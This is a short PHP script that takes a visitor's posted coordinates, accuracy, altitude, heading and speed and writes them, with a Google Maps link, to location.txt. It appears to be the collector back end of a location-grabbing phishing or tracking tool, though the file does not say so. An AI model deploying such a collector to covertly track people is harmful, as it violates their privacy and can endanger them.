<?php
{
  $lat = $_POST['Lat'];
  $lon = $_POST['Lon'];
  $acc = $_POST['Acc'];
  $alt = $_POST['Alt'];
  $dir = $_POST['Dir'];
  $spd = $_POST['Spd'];

  $linkdata = ("https://www.google.com/maps/place/".$lat."+".$lon."\r\n");
  $data = (" Latitude: " .$lat. " Longitude: " .$lon. " Accuracy: " .$acc. " Altitude: " .$alt. " Direction: " .$dir. " Speed: " .$spd. "\r\n");
  
  $f = fopen( 'location.txt', 'w+');
  fwrite($f, $linkdata);
  fwrite($f, $data);
  fclose($f);
}
?>